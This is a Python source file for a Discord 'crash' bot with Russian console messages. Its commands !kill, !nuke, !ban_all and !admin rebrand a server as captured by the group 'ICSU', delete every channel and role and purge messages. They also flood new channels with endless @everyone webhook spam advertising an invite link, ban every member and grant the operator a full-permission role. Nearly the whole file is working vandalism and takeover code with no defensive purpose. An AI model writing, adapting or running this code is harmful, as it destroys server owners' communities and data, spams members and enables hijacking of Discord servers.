# bot_template.py
try:
    import os
    import discord
    from discord.ext import commands
    from discord import Permissions
    import asyncio
    import datetime
except:
    print("Не найдено библеотек.")
    print("Попробуйте установить их через команду pip install -r requirements.txt")

with open("token.txt", "r", encoding="utf-8") as f:
    TOKEN = f.read().strip()
    print("[+] - Токены прочитаны. Не забудьте включить все интенты для бота на сайте Discord Developer Portal")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")

CRASH_CHANNEL_NAME = "☠-crashed-by-icsu-{}"
CRASH_SERVER_NAME = ">>CRSHHD BY ICSU>>"
CRASH_DESCRIPTION = (
    "Сервер захвачен группировкой СЕООИ, переходите на наш сервер >>> https://discord.gg/jPzvYYjRSd"
)
ICON_PATH = "icon.png"


@bot.event
async def on_ready():
    activity = discord.Activity(type=discord.ActivityType.watching, name="https://discord.gg/jPzvYYjRSd")
    await bot.change_presence(status=discord.Status.online, activity=activity)
    print(f"[+] Бот запущен как {bot.user}")
    print("Все команды:")
    print("!kill - автоматический краш сервера")
    print("!nuke - удаление всех каналов")
    print("!admin - выдача прав администратора")
    print("!ban_all - забанить всех пользователей")


async def wipe_channels(guild, create_one=False):
    index = 0
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            try:
                await channel.edit(name=CRASH_CHANNEL_NAME.format(0))
                async for msg in channel.history(limit=1000):
                    await msg.delete()
            except:
                pass

    if create_one:
        await guild.create_text_channel(CRASH_CHANNEL_NAME.format(0))


async def create_crash_channels(guild):
    channels = []
    for i in range(15):
        try:
            ch = await guild.create_text_channel(CRASH_CHANNEL_NAME.format(i))
            channels.append(ch)
        except:
            continue
    return channels


async def disable_everyone_permissions(guild, channels):
    everyone = guild.default_role
    for i, channel in enumerate(channels):
        perms = channel.overwrites_for(everyone)
        perms.send_messages = False if i != 0 else True
        await channel.set_permissions(everyone, overwrite=perms)


async def spam_webhook(webhook):
    while True:
        try:
            await webhook.send(
                "@everyone CRSHHD BY ICSU >>> https://discord.gg/jPzvYYjRSd",
                username="ICSU",
            )
        except:
            break


async def setup_webhooks(channels):
    for channel in channels:
        try:
            webhook = await channel.create_webhook(name="ICSU")
            asyncio.create_task(spam_webhook(webhook))
        except:
            continue


async def delete_roles(guild):
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                continue


async def create_roles(guild):
    for _ in range(10):
        try:
            await guild.create_role(name="CRSHHD BY ICSU", permissions=Permissions.none())
        except:
            continue


@bot.command()
@commands.has_permissions(administrator=True)
async def kill(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    print("[~] Выполняется !kill")

    if os.path.exists(ICON_PATH):
        with open(ICON_PATH, "rb") as icon:
            await guild.edit(icon=icon.read())

    await guild.edit(name=CRASH_SERVER_NAME, description=CRASH_DESCRIPTION)
    start_time = discord.utils.utcnow() + datetime.timedelta(minutes=1)
    end_time = start_time + datetime.timedelta(days=365)

    try:
        event = await guild.create_scheduled_event(
            name="ICSU links",
            description="Discord: https://discord.gg/jPzvYYjRSd\nYouTube: https://www.youtube.com/@Robert_238\nGitHub: https://github.com/xnnder",
            start_time=start_time,
            end_time=end_time,
            entity_type=discord.EntityType.external,
            location="https://discord.gg/jPzvYYjRSd",
            privacy_level=discord.PrivacyLevel.guild_only,
        )
        await ctx.send(f"Событие создано: {event.name}")
    except discord.Forbidden:
        await ctx.send("У бота нет прав на создание событий.")
    except Exception as e:
        await ctx.send(f"Ошибка при создании события: {e}")

    await wipe_channels(guild)

    crash_channels = await create_crash_channels(guild)
    await disable_everyone_permissions(guild, crash_channels)
    await setup_webhooks(crash_channels)

    await delete_roles(guild)
    await create_roles(guild)

    print("[+] Краш завершён.")


@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    await ctx.message.delete()
    print("[~] Выполняется !nuke")

    guild = ctx.guild
    await wipe_channels(guild, create_one=True)

    print("[+] Все каналы удалены или переименованы.")


@bot.command()
@commands.has_permissions(administrator=True)
async def ban_all(ctx):
    await ctx.message.delete()
    print("[~] Выполняется !ban-all")

    for member in ctx.guild.members:
        if member == ctx.author or member == bot.user:
            continue
        try:
            await member.ban(reason="CRSHHD BY ICSU")
            print(f"[+] Забанен: {member}")
        except:
            print(f"[-] Не удалось забанить: {member}")


@bot.command()
@commands.has_permissions(administrator=True)
async def admin(ctx):
    await ctx.message.delete()
    print("[~] Выполняется !admin")

    guild = ctx.guild
    role_name = "ICSU ADMIN"
    role = discord.utils.get(guild.roles, name=role_name)

    if not role:
        role = await guild.create_role(
            name=role_name, permissions=Permissions.all()
        )

    await ctx.author.add_roles(role)
    print(f"[+] Выдана роль {role_name} пользователю {ctx.author}")


bot.run(TOKEN)
